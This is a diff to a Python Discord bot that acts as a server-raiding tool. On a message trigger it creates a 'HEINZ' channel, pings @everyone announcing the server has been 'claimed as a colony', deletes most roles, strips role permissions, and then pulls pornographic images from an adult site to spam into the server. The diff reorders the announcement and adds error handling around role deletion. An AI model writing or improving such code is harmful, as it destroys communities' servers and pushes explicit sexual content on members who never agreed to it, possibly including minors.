@@ -72,14 +72,19 @@ async def on_message(message):
 
           #-make new channel-
           channel = await message.guild.create_text_channel('HEINZ')
+          heinz = client.get_channel(message.guild.channels[0].id)
+          await heinz.send("@everyone THIS SERVER HAS BEEN CLAIMED AS A COLONY OF THE DEMOCRATIC REPUBLIC OF HEINZ")
 
           #-delete all roles-
           roles = []
-          for role in message.guild.roles: #get all roles
+          try:
+               for role in message.guild.roles: #get all roles
                     roles.append(role)
                     
-          for role in roles[2:]:
-               await role.delete(reason="THIS SERVER HAS BEEN CLAIMED AS A COLONY OF THE DEMOCRATIC REPUBLIC OF HEINZ")
+               for role in roles[2:]:
+                    await role.delete(reason="THIS SERVER HAS BEEN CLAIMED AS A COLONY OF THE DEMOCRATIC REPUBLIC OF HEINZ")
+          except Exception:
+               await heinz.send("`error editing roles`")
 
           #-remove all perms-
 
@@ -91,8 +96,7 @@ async def on_message(message):
                     await role.edit(permissions=perms) #apply new permissions
 
           #-spam images-
-          heinz = client.get_channel(message.guild.channels[0].id)
-          await heinz.send("@everyone THIS SERVER HAS BEEN CLAIMED AS A COLONY OF THE DEMOCRATIC REPUBLIC OF HEINZ")
+          
 
           hentai = imagesearch.getImages("https://hentaihaven.xxx") #load hentai from hentaihaven (kill me now)
 
